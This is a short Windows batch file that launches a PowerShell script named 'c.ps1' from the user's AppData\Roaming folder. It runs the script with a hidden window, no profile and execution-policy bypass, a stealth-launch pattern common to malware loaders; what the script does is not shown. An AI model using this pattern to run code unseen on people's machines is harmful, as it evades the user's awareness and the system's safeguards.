@echo off
powershell -Command "& {cd "$env:userprofile\AppData\Roaming"; powershell -w h -NoP -NonI -Ep Bypass -File "c.ps1"}"
pause
